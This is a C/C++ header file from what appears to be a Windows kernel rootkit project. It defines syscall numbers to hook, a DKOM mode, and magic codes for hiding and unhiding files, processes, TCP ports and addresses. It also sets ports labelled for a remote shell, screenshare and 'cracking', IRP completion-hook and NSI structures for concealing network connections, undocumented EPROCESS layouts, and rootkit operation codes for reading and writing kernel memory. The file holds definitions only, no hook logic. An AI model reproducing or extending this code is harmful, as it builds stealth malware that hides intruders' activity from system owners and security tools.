#pragma once
#pragma warning(disable : 4201)
#include <ntifs.h>
#include <wdm.h>
#include <ntddk.h>
#include <ntimage.h>
#include <minwindef.h>
#include "problematic.h"

#define IS_DKOM 1  // TRUE, 0 = NtQuerySystemInformation hook
#define NTQUERY_TAG 'HkQr'
#define NTQUERYEX_TAG 'HkQx'
#define NTQUERYSYSINFO_TAG 'HkSi'
#define TCPIP_TAG 'DoTi'
#define NSIPROXY_TAG 'DoNp'


/* Note: because of
https://support.microsoft.com/en-gb/topic/march-25-2024-kb5037425-os-build-17763-5579-out-of-band-fa8fb7fa-8185-408f-bdd6-ea575ce2fcb5
the syscall numbers for 1809 match the ones for windows 10 21H2/22H2
*/

#define NTQUERYEX_SYSCALL 0x0143
#define NTQUERY_SYSCALL 0x0035
#define NTQUERYSYSINFO_SYSCALL 0x0036
#define REGULAR_BUFFER 0xDEAFBEED  // Represents a normal buffer


// Default port numbers:
#define DEFAULT_MEDIUM_PORT 44444
#define TARGET_WEBSERVER 8050
#define TARGET_SHELL 8060
#define TARGET_SCREENSHARE 8070
#define TARGET_CRACKING 8090


// Definitions of file/process/port hiding values:
#define SHOW_HIDDEN 0x7777FFFFFFFFFFFF  // Remove a file from HookHide
#define HIDE_FILE 0xFFFFFFFFFFFFFFFF  // Hide a file in HookHide

#define UNHIDE_TEMPSUC STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY  // Temporary success for un-hiding file/folder
#define HIDE_TEMPSUC STATUS_WX86_CREATEWX86TIB  // Temporary success for hiding file/folder
#define SHOWHIDDEN_TEMPSUC STATUS_VOLSNAP_HIBERNATE_READY  // Temporary success for showing list

#define UNHIDE_PORT STATUS_INVALID_NETWORK_RESPONSE  // Code used by client/medium for unhiding ports
#define HIDE_PORT STATUS_VIRTUAL_CIRCUIT_CLOSED  // Code used by client/medium for hiding ports
#define SHOWHIDDEN_PORTS STATUS_INTERNAL_DB_CORRUPTION  // Code used by client/medium for listing hidden ports

#define REMOVE_BY_INDEX_PID 0xFCFCFCCFCFCFDB  // Value of PID when asking to remove by index and not by PID
#define UnhideProcess 0xC0C0C0C00C0C0C0C
#define HideProcess 0xCDCDCDCDDCDCDCDC
#define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0

#define UnhideAddress 0xC0C0C0C00C0C0C0C
#define HideAddress 0xCDCDCDCDDCDCDCDC
#define ListHiddenAddresses 0x0D0D0D0DD0D0D0D0
#define REMOVE_BY_INDEX_ADDR 0xFFFFFFFF
#define IOCTL_NSI_QUERYCONNS 0x12001B
#define NSI_PARAMS_LENGTH 0x70

typedef struct _EX_FAST_REF {
	PVOID Object;
} EX_FAST_REF, * PEX_FAST_REF;

typedef struct _RTL_AVL_TREE {
	RTL_BALANCED_NODE* Root;
} RTL_AVL_TREE, * PRTL_AVL_TREE;

typedef struct _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES {
	RTL_AVL_TREE Tree;
	EX_PUSH_LOCK Lock;
} PS_DYNAMIC_ENFORCED_ADDRESS_RANGES, *PPS_DYNAMIC_ENFORCED_ADDRESS_RANGES;

typedef struct _KAFFINITY_EX {
	char Affinity[0xA8];
} KAFFINITY_EX, * PKAFFINITY_EX;

typedef struct _KSTACK_COUNT {
	ULONG State;
	ULONG StackCount;
} KSTACK_COUNT, * PKSTACK_COUNT;

typedef struct _MMSUPPORT_FLAGS {
	/*
	0x000 WorkingSetType   : Pos 0, 3 Bits
		+ 0x000 Reserved0 : Pos 3, 3 Bits
		+ 0x000 MaximumWorkingSetHard : Pos 6, 1 Bit
		+ 0x000 MinimumWorkingSetHard : Pos 7, 1 Bit
		+ 0x001 SessionMaster : Pos 0, 1 Bit
		+ 0x001 TrimmerState : Pos 1, 2 Bits
		+ 0x001 Reserved : Pos 3, 1 Bit
		+ 0x001 PageStealers : Pos 4, 4 Bits
		*/
	USHORT u1;
	UCHAR MemoryPriority;
		/*
		+ 0x003 WsleDeleted : Pos 0, 1 Bit
		+ 0x003 SvmEnabled : Pos 1, 1 Bit
		+ 0x003 ForceAge : Pos 2, 1 Bit
		+ 0x003 ForceTrim : Pos 3, 1 Bit
		+ 0x003 NewMaximum : Pos 4, 1 Bit
		+ 0x003 CommitReleaseState : Pos 5, 2 Bits
		*/
	UCHAR u2;
}MMSUPPORT_FLAGS, * PMMSUPPORT_FLAGS;

typedef struct _MMSUPPORT_INSTANCE {
	UINT NextPageColor;
	UINT PageFaultCount;
	UINT64 TrimmedPageCount;
	PVOID VmWorkingSetList;
	LIST_ENTRY WorkingSetExpansionLinks;
	UINT64 AgeDistribution[8];
	PVOID ExitOutswapGate;
	UINT64 MinimumWorkingSetSize;
	UINT64 WorkingSetLeafSize;
	UINT64 WorkingSetLeafPrivateSize;
	UINT64 WorkingSetSize;
	UINT64 WorkingSetPrivateSize;
	UINT64 MaximumWorkingSetSize;
	UINT64 PeakWorkingSetSize;
	UINT HardFaultCount;
	USHORT LastTrimStamp;
	USHORT PartitionId;
	UINT64 SelfmapLock;
	MMSUPPORT_FLAGS Flags;
} MMSUPPORT_INSTANCE, * PMMSUPPORT_INSTANCE;

typedef struct _MMSUPPORT_SHARED {
	long WorkingSetLock;
	long GoodCitizenWaiting;
	UINT64 ReleasedCommitDebt;
	UINT64 ResetPagesRepurposedCount;
	PVOID WsSwapSupport;
	PVOID CommitReleaseContext;
	PVOID AccessLog;
	UINT64 ChargedWslePages;
	UINT64 ActualWslePages;
	UINT64 WorkingSetCoreLock;
	PVOID ShadowMapping;
} MMSUPPORT_SHARED, * PMMSUPPORT_SHARED;

typedef struct _MMSUPPORT_FULL {
	MMSUPPORT_INSTANCE Instance;
	MMSUPPORT_SHARED Shared;
	UCHAR Padding[48];
} MMSUPPORT_FULL, * PMMSUPPORT_FULL;

typedef struct _ALPC_PROCESS_CONTEXT {
	char AlpcContext[0x20];
} ALPC_PROCESS_CONTEXT, * PALPC_PROCESS_CONTEXT;

typedef struct _JOBOBJECT_WAKE_FILTER{
	UINT HighEdgeFilter;
	UINT LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

typedef struct _PS_PROCESS_WAKE_INFORMATION {
	UINT64 NotificationChannel;
	UINT WakeCounters[7];
	JOBOBJECT_WAKE_FILTER WakeFilter;
	UINT NoWakeCounter;
} PS_PROCESS_WAKE_INFORMATION, * PPS_PROCESS_WAKE_INFORMATION;

typedef struct _PS_PROTECTION
{
	union
	{
		UCHAR Level;                                                        //0x0
		struct
		{
			UCHAR Type : 3;                                                   //0x0
			UCHAR Audit : 1;                                                  //0x0
			UCHAR Signer : 4;                                                 //0x0
		};
	};
} PS_PROTECTION, * PPS_PROTECTION;

extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE AccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContext OPTIONAL,
	PVOID * Object
);

extern "C" POBJECT_TYPE * IoDriverObjectType;


// Internal EPROCESS/KPROCESS of 1809:
typedef struct _ACTKPROCESS {
	DISPATCHER_HEADER Header;
	LIST_ENTRY ProfileListHead;
	UINT64 DirectoryTableBase;
	LIST_ENTRY ThreadListHead;
	UINT ProcessLock;
	UINT ProcessTimerDelay;
	UINT64 DeepFreezeStartTime;
	KAFFINITY_EX Affinity;
	UINT64 AffinityPadding[12];
	LIST_ENTRY ReadyListHead;
	SINGLE_LIST_ENTRY SwapListEntry;
	KAFFINITY_EX ActiveProcessors;
	UINT64 ActiveProcessorsPadding[12];
	/*
   AutoAlignment    : Pos 0; 1 Bit
   DisableBoost     : Pos 1; 1 Bit
   DisableQuantum   : Pos 2; 1 Bit
   DeepFreeze       : Pos 3; 1 Bit
   TimerVirtualization : Pos 4; 1 Bit
   CheckStackExtents : Pos 5; 1 Bit
   CacheIsolationEnabled : Pos 6; 1 Bit
   PpmPolicy        : Pos 7; 3 Bits
   ActiveGroupsMask : Pos 10; 20 Bits
   VaSpaceDeleted   : Pos 30; 1 Bit
   ReservedFlags    : Pos 31; 1 Bit
	*/
	int ProcessFlags;
	int ActiveGroupsMask;
	char BasePriority;
	char QuantumReset;
	char Visited;
	char Flags;
	USHORT ThreadSeed[20];
	USHORT ThreadSeedPadding[12];
	USHORT IdealProcessor[20];
	USHORT IdealProcessorPadding[12];
	USHORT IdealNode[20];
	USHORT IdealNodePadding[12];
	USHORT IdealGlobalNode;
	USHORT Spare1;
	KSTACK_COUNT StackCount;
	LIST_ENTRY ProcessListEntry;
	UINT64 CycleTime;
	UINT64 ContextSwitches;
	PVOID SchedulingGroup;
	UINT FreezeCount;
	UINT KernelTime;
	UINT UserTime;
	UINT ReadyTime;
	UINT64 UserDirectoryTableBase;
	UCHAR AddressPolicy;
	UCHAR Spare[71];
	PVOID InstrumentationCallback;
	PVOID SecureState;
	PVOID KernelWaitTime;
	PVOID UserWaitTime;
	UINT64 EndPadding[8];
} ACTKPROCESS, * PACTKPROCESS;

typedef struct _ACTEPROCESS {
	ACTKPROCESS Pcb;
	EX_PUSH_LOCK ProcessLock;
	PVOID UniqueProcessId;
	LIST_ENTRY ActiveProcessLinks;
	EX_RUNDOWN_REF RundownProtect;
	UINT Flags2;
	/*
		+ 0x300 JobNotReallyActive : Pos 0, 1 Bit
		+ 0x300 AccountingFolded : Pos 1, 1 Bit
		+ 0x300 NewProcessReported : Pos 2, 1 Bit
		+ 0x300 ExitProcessReported : Pos 3, 1 Bit
		+ 0x300 ReportCommitChanges : Pos 4, 1 Bit
		+ 0x300 LastReportMemory : Pos 5, 1 Bit
		+ 0x300 ForceWakeCharge : Pos 6, 1 Bit
		+ 0x300 CrossSessionCreate : Pos 7, 1 Bit
		+ 0x300 NeedsHandleRundown : Pos 8, 1 Bit
		+ 0x300 RefTraceEnabled : Pos 9, 1 Bit
		+ 0x300 PicoCreated : Pos 10, 1 Bit
		+ 0x300 EmptyJobEvaluated : Pos 11, 1 Bit
		+ 0x300 DefaultPagePriority : Pos 12, 3 Bits
		+ 0x300 PrimaryTokenFrozen : Pos 15, 1 Bit
		+ 0x300 ProcessVerifierTarget : Pos 16, 1 Bit
		+ 0x300 RestrictSetThreadContext : Pos 17, 1 Bit
		+ 0x300 AffinityPermanent : Pos 18, 1 Bit
		+ 0x300 AffinityUpdateEnable : Pos 19, 1 Bit
		+ 0x300 PropagateNode : Pos 20, 1 Bit
		+ 0x300 ExplicitAffinity : Pos 21, 1 Bit
		+ 0x300 ProcessExecutionState : Pos 22, 2 Bits
		+ 0x300 EnableReadVmLogging : Pos 24, 1 Bit
		+ 0x300 EnableWriteVmLogging : Pos 25, 1 Bit
		+ 0x300 FatalAccessTerminationRequested : Pos 26, 1 Bit
		+ 0x300 DisableSystemAllowedCpuSet : Pos 27, 1 Bit
		+ 0x300 ProcessStateChangeRequest : Pos 28, 2 Bits
		+ 0x300 ProcessStateChangeInProgress : Pos 30, 1 Bit
		+ 0x300 InPrivate : Pos 31, 1 Bit
		*/
	UINT Flags;
	/*
+ 0x304 CreateReported : Pos 0, 1 Bit
+ 0x304 NoDebugInherit : Pos 1, 1 Bit
+ 0x304 ProcessExiting : Pos 2, 1 Bit
+ 0x304 ProcessDelete : Pos 3, 1 Bit
+ 0x304 ManageExecutableMemoryWrites : Pos 4, 1 Bit
+ 0x304 VmDeleted : Pos 5, 1 Bit
+ 0x304 OutswapEnabled : Pos 6, 1 Bit
+ 0x304 Outswapped : Pos 7, 1 Bit
+ 0x304 FailFastOnCommitFail : Pos 8, 1 Bit
+ 0x304 Wow64VaSpace4Gb : Pos 9, 1 Bit
+ 0x304 AddressSpaceInitialized : Pos 10, 2 Bits
+ 0x304 SetTimerResolution : Pos 12, 1 Bit
+ 0x304 BreakOnTermination : Pos 13, 1 Bit
+ 0x304 DeprioritizeViews : Pos 14, 1 Bit
+ 0x304 WriteWatch : Pos 15, 1 Bit
+ 0x304 ProcessInSession : Pos 16, 1 Bit
+ 0x304 OverrideAddressSpace : Pos 17, 1 Bit
+ 0x304 HasAddressSpace : Pos 18, 1 Bit
+ 0x304 LaunchPrefetched : Pos 19, 1 Bit
+ 0x304 Background : Pos 20, 1 Bit
+ 0x304 VmTopDown : Pos 21, 1 Bit
+ 0x304 ImageNotifyDone : Pos 22, 1 Bit
+ 0x304 PdeUpdateNeeded : Pos 23, 1 Bit
+ 0x304 VdmAllowed : Pos 24, 1 Bit
+ 0x304 ProcessRundown : Pos 25, 1 Bit
+ 0x304 ProcessInserted : Pos 26, 1 Bit
+ 0x304 DefaultIoPriority : Pos 27, 3 Bits
+ 0x304 ProcessSelfDelete : Pos 30, 1 Bit
+ 0x304 SetTimerResolutionLink : Pos 31, 1 Bit
*/
	LARGE_INTEGER CreateTime;
	UINT64 ProcessQuotaUsage[2];
	UINT64 ProcessQuotaPeak[2];
	UINT64 PeakVirtualSize;
	UINT64 VirtualSize;
	LIST_ENTRY SessionProcessLinks;
	PVOID ExceptionPortData;  // also defined as UINT64 ExceptionPortValue;
	/*
+ 0x350 ExceptionPortState : Pos 0, 3 Bits
*/
	EX_FAST_REF Token;
	UINT64 MmReserved;
	ULONG_PTR AddressCreationLock;
	ULONG_PTR PageTableCommitmentLock;
	PVOID RotateInProgress;
	PVOID ForkInProgress;
	PVOID CommitChargeJob;
	ULONG64 CloneRoot;
	UINT64 NumberOfPrivatePages;
	UINT64 NumberOfLockedPages;
	PVOID Win32Process;
	PVOID Job;
	PVOID SectionObject;
	PVOID SectionBaseAddress;
	UINT64 Cookie;
	PVOID WorkingSetWatch;
	PVOID Win32WindowStation;
	PVOID InheritedFromUniqueProcessId;
	UINT64 OwnerProcessId;
	PVOID Peb;
	PVOID Session;
	PVOID Spare1;
	PVOID QuotaBlock;
	PVOID ObjectTable;
	PVOID DebugPort;
	PVOID WoW64Process;
	PVOID DeviceMap;
	PVOID EtwDataSource;
	UINT64 PageDirectoryPte;
	PVOID ImageFilePointer;
	UCHAR ImageFileName[15];
	UCHAR PriorityClass;
	PVOID SecurityPort;
	ULONG64 SeAuditProcessCreationInfo;
	LIST_ENTRY JobLinks;
	PVOID HighestUserAddress;
	LIST_ENTRY ThreadListHead;
	UINT ActiveThreads;
	UINT ImagePathHash;
	UINT DefaultHardErrorProcessing;
	int LastThreadExitStatus;
	EX_FAST_REF PrefetchTrace;
	PVOID LockedPagesList;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	UINT64 CommitChargeLimit;
	UINT64 CommitCharge;
	UCHAR CommitChargePeak[48];
	MMSUPPORT_FULL Vm;
	LIST_ENTRY MmProcessLinks;
	UINT ModifiedPageCount;
	int ExitStatus;
	RTL_AVL_TREE VadRoot;
	PVOID VadHint;
	UINT64 VadCount;
	UINT64 VadPhysicalPages;
	UINT64 VadPhysicalPagesLimit;
	ALPC_PROCESS_CONTEXT AlpcContext;

	LIST_ENTRY TimerResolutionLink;
	PVOID TimerResolutionStackRecord;
	UINT RequestedTimerResolution;
	UINT SmallestTimerResolution;
	LARGE_INTEGER ExitTime;
	PVOID InvertedFunctionTable;
	EX_PUSH_LOCK InvertedFunctionTableLock;
	UINT ActiveThreadsHighWatermark;
	UINT LargePrivateVadCount;
	EX_PUSH_LOCK ThreadListLock;
	PVOID WnfContext;
	PVOID ServerSilo;
	UCHAR SignatureLevel;
	UCHAR SectionSignatureLevel;
	PS_PROTECTION Protection;
	union {
		UCHAR HangCount;
		UCHAR GhostCount;
		UCHAR PrefilterException;
	};
	union {
		UINT Flags3;
		UINT Minimal;
		UINT ReplacingPageRoot;
		UINT Crashed;
		UINT JobVadsAreTracked;
		UINT VadTrackingDisabled;
		UINT AuxiliaryProcess;
		UINT SubsystemProcess;
		UINT IndirectCpuSets;
		UINT RelinquishedCommit;
		UINT HighGraphicsPriority;
		UINT CommitFailLogged;
		UINT ReserveFailLogged;
		UINT SystemProcess;
		UINT HideImageBaseAddresses;
		UINT AddressPolicyFrozen;
		UINT ProcessFirstResume;
		UINT ForegroundExternal;
		UINT ForegroundSystem;
		UINT HighMemoryPriority;
		UINT EnableProcessSuspendResumeLogging;
		UINT EnableThreadSuspendResumeLogging;
		UINT SecurityDomainChanged;
		UINT SecurityFreezeComplete;
		UINT VmProcessorHost;
		UINT VmProcessorHostTransition;
		UINT AltSyscall;
		UINT TimerResolutionIgnore;
		UINT DisallowUserTerminate;
	};

	INT64 DeviceAsid;
	PVOID SvmData;
	EX_PUSH_LOCK SvmProcessLock;
	UINT64 SvmLock;

	LIST_ENTRY SvmProcessDeviceListHead;
	UINT64 LastFreezeInterruptTime;
	PVOID DiskCounters;
	PVOID PicoContext;
	PVOID EnclaveTable;
	UINT64 EnclaveNumber;
	EX_PUSH_LOCK EnclaveLock;

	UINT64 HighPriorityFaultsAllowed;
	PVOID EnergyContext;
	PVOID VmContext;
	UINT64 SequenceNumber;
	UINT64 CreateInterruptTime;
	UINT64 CreateUnbiasedInterruptTime;
	UINT64 TotalUnbiasedFrozenTime;
	UINT64 LastAppStateUpdateTime;

	union {
		ULONG64 LastAppStateUptime;
		ULONG64 LastAppState;
	};

	UINT64 SharedCommitCharge;
	EX_PUSH_LOCK SharedCommitLock;
	LIST_ENTRY SharedCommitLinks;

	union {
		UINT64 AllowedCpuSets;
		UINT64 AllowedCpuSetsIndirect;
	};
	union {
		UINT64 DefaultCpuSets;
		UINT64 DefaultCpuSetsIndirect;
	};

	PVOID DiskIoAttribution;
	PVOID DxgProcess;
	UINT64 Win32KFilterSet;
	ULONG64 ProcessTimerDelay;
	UINT KTimerSets;
	UINT KTimer2Sets;
	UINT64 ThreadTimerSets;
	UINT64 VirtualTimerListLock;


	LIST_ENTRY VirtualTimerListHead;
	union {
		WNF_STATE_NAME WakeChannel;
		PS_PROCESS_WAKE_INFORMATION WakeInfo;
	};

	union {
		UINT MitigationFlags;
		UINT MitigationFlagsValues;
	};

	union {
		UINT MitigationFlags2;
		UINT MitigationFlags2Values;
	};
	PVOID PartitionObject;
	UINT64 SecurityDomain;
	UINT64 ParentSecurityDomain;
	PVOID CoverageSamplerContext;		
	PVOID MmHotPatchContext;
	RTL_AVL_TREE DynamicEHContinuationTargetsTree;
	EX_PUSH_LOCK DynamicEHContinuationTargetsLock;
	PS_DYNAMIC_ENFORCED_ADDRESS_RANGES DynamicEnforcedCetCompatibleRanges;
	UINT64 DisabledComponentFlags;
	UINT64 PathRedirectionHashes;

	union {
		ULONG MitigationFlags3[4];
		ULONG MitigationFlags3Values[4];
	};
} ACTEPROCESS, * PACTEPROCESS;

typedef struct _SHORTENEDACTEPROCESS {
	PVOID UniqueProcessId;
	UINT Flags;
	LARGE_INTEGER CreateTime;
	UINT64 PeakVirtualSize;
	UINT64 VirtualSize;
	UINT64 Cookie;
	UINT64 OwnerProcessId;
	UINT64 PageDirectoryPte;
	UCHAR ImageFileName[15];
	UCHAR PriorityClass;
	PVOID HighestUserAddress;
	UINT ActiveThreads;
	int LastThreadExitStatus;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	int ExitStatus;
} SHORTENEDACTEPROCESS, * PSHORTENEDACTEPROCESS;


/*
=====================
REQUIRED DEFINITIONS:
=====================
*/


// IRP definitions:
typedef struct _HP_CONTEXT
{
	PIO_COMPLETION_ROUTINE oldIocomplete;
	PVOID oldCtx;
	BOOLEAN bShouldInvolve;
	PKPROCESS pcb;
}HP_CONTEXT, * PHP_CONTEXT;

typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
{
	char bytesfill0[2];
	USHORT Port;
	DWORD dwIP;
	char bytesfill[20];

}INTERNAL_TCP_TABLE_SUBENTRY, * PINTERNAL_TCP_TABLE_SUBENTRY;

typedef struct _INTERNAL_TCP_TABLE_ENTRY
{
	INTERNAL_TCP_TABLE_SUBENTRY localEntry;
	INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;

}INTERNAL_TCP_TABLE_ENTRY, * PINTERNAL_TCP_TABLE_ENTRY;

typedef struct _NSI_STATUS_ENTRY
{
	char bytesfill[12];

}NSI_STATUS_ENTRY, * PNSI_STATUS_ENTRY;

typedef struct _NSI_PARAM
{

	DWORD UnknownParam1;
	DWORD UnknownParam2;
	DWORD UnknownParam3;
	DWORD UnknownParam4;
	DWORD UnknownParam5;
	DWORD UnknownParam6;
	PVOID lpMem;
	DWORD UnknownParam8;
	DWORD UnknownParam9;
	DWORD UnknownParam10;
	PNSI_STATUS_ENTRY lpStatus;
	DWORD UnknownParam12;
	DWORD UnknownParam13;
	DWORD UnknownParam14;
	DWORD TcpConnCount;


}NSI_PARAM, * PNSI_PARAM;


typedef struct _HOOKED_IO_COMPLETION {
	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
	PVOID OriginalContext;
	LONG InvokeOnSuccess;
	PEPROCESS RequestingProcess;
} HOOKED_IO_COMPLETION, * PHOOKED_IO_COMPLETION;


typedef enum _NPI_MODULEID_TYPE {
	MIT_GUID = 1,
	MIT_IF_LUID,
} NPI_MODULEID_TYPE;

typedef struct _NPI_MODULEID {
	USHORT            Length;
	NPI_MODULEID_TYPE Type;
	union {
		GUID Guid;
		LUID IfLuid;
	};
} NPI_MODULEID, * PNPI_MODULEID;

typedef struct _NSI_STRUCTURE_ENTRY {
	ULONG IpAddress;
	UCHAR Unknown[52];
} NSI_STRUCTURE_ENTRY, * PNSI_STRUCTURE_ENTRY;

typedef struct _NSI_STRUCTURE_2 {
	UCHAR Unknown[32];
	NSI_STRUCTURE_ENTRY EntriesStart[1];
} NSI_STRUCTURE_2, * PNSI_STRUCTURE_2;

typedef struct _NSI_STRUCTURE_1 {
	UCHAR Unknown1[40];
	PNSI_STRUCTURE_2 Entries;
	SIZE_T EntrySize;
	UCHAR Unknown2[48];
	SIZE_T NumberOfEntries;
} NSI_STRUCTURE_1, * PNSI_STRUCTURE_1;


// ZwQuerySystemInformation return structures -
typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, * PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved2;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID Reserved3;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG Reserved4;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	PVOID Reserved5;
	SIZE_T QuotaPagedPoolUsage;
	PVOID Reserved6;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER Reserved1[3];
	ULONG Reserved2;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG Reserved3;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
	ULONG RegistryQuotaAllowed;
	ULONG RegistryQuotaUsed;
	PVOID Reserved1;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, * PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
	BYTE Reserved1[24];
	PVOID Reserved2[4];
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
	BYTE Reserved1[48];
} SYSTEM_TIMEOFDAY_INFORMATION, * PSYSTEM_TIMEOFDAY_INFORMATION;

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
	BYTE Reserved1[312];
} SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION {
	BYTE Reserved1[16];
} SYSTEM_EXCEPTION_INFORMATION, * PSYSTEM_EXCEPTION_INFORMATION;

typedef struct _SYSTEM_LOOKASIDE_INFORMATION {
	BYTE Reserved1[32];
} SYSTEM_LOOKASIDE_INFORMATION, * PSYSTEM_LOOKASIDE_INFORMATION;

typedef struct _SYSTEM_INTERRUPT_INFORMATION {
	BYTE Reserved1[24];
} SYSTEM_INTERRUPT_INFORMATION, * PSYSTEM_INTERRUPT_INFORMATION;

typedef struct _SYSTEM_POLICY_INFORMATION {
	PVOID Reserved1[2];
	ULONG Reserved2[3];
} SYSTEM_POLICY_INFORMATION, * PSYSTEM_POLICY_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
	ULONG   Length;
	ULONG   CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, * PSYSTEM_CODEINTEGRITY_INFORMATION;

typedef struct _SYSTEM_MODULE
{
	PVOID Reserved[2];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT Unknown;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	CHAR ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG ModulesCount;
	SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;


// data about a specific module from a process (i.e an DLL imported in the process) -
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

// data about all DLLs (loaded modules) of a specific process, returned in ZwQuerySystemInformation with SystemModuleInformation -
typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;


// SYSTEM_INFORMATION_CLASS definitions for ZwQuerySystemInformation -
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45,
	SystemCodeIntegrityInformation = 103,
	SystemPolicyInformation = 134,
	SystemModuleInformation = 0x0B,
} SYSTEM_INFORMATION_CLASS;



/*
============================
DEPENDENCIES OF MAIN STRUCT:
============================
*/


typedef enum _ROOTKIT_STATUS {
	ROOTKSTATUS_SUCCESS = 0xFF000000,
	ROOTKSTATUS_SYSTEMSPC = 0xFF000001,
	ROOTKSTATUS_PRCPEB = 0xFF000002,
	ROOTKSTATUS_PRCLOADMDLS = 0xFF000003,
	ROOTKSTATUS_OTHER = 0xFF000004,
	ROOTKSTATUS_ADRBUFSIZE = 0xFF000005,
	ROOTKSTATUS_QUERYVIRTMEM = 0xFF000006,
	ROOTKSTATUS_INVARGS = 0xFF000007,
	ROOTKSTATUS_PROTECTIONSTG = 0xFF000008,
	ROOTKSTATUS_NOWRITEPRMS = 0xFF000009,
	ROOTKSTATUS_COPYFAIL = 0x0000000A,
	ROOTKSTATUS_LESSTHNREQ = 0xFF00000B,
	ROOTKSTATUS_MEMALLOC = 0xFF00000C,
	ROOTKSTATUS_NOTCOMMITTED = 0xFF00000D,
	ROOTKSTATUS_QUERYSYSINFO = 0xFF00000E,
	ROOTKSTATUS_PROCHANDLE = 0xFF00000F,
	ROOTKSTATUS_ACSVIO = 0xFF000010,
	ROOTKSTATUS_NOTSUPPORTED = 0xFF000011,
	ROOTKSTATUS_NOTINRELRANGE = 0xFF000012,
	ROOTKSTATUS_PROCESSEPRC = 0XFF000013,
	ROOTKSTATUS_USERSPACE = 0XFF000014,
}ROOTKIT_STATUS, * PROOTKIT_STATUS;


typedef enum _ROOTKIT_OPERATION {
	RKOP_WRITE = 0xB000006F,
	RKOP_READ = 0xB000007F,
	RKOP_MDLBASE = 0xB000008F,
	RKOP_SYSINFO = 0xB000009F,
	RKOP_PRCMALLOC = 0xB00000AF,
	RKOP_HIDEFILE = 0xB00000BF,
	RKOP_HIDEPROC = 0xB00000CF,
	RKOP_HIDEADDR = 0xB00000DF,

	RKOP_NOOPERATION = 0xB0000101,
	RKOP_TERMINATE = 0xB0000102,
}ROOTKIT_OPERATION, * PROOTKIT_OPERATION;


typedef enum _ROOTKIT_UNEXERR {
	successful = 0x7F7F0000,
	memalloc = 0x7F7F0001,
	relevantpid = 0x7F7F0002,
	receivedata = 0x7F7F0003,
	sendmessage = 0x7F7F0004,
	invalidargs = 0x7F7F0005,
}ROOTKIT_UNEXERR, * PROOTKIT_UNEXERR;


// Struct about passing data on system information -
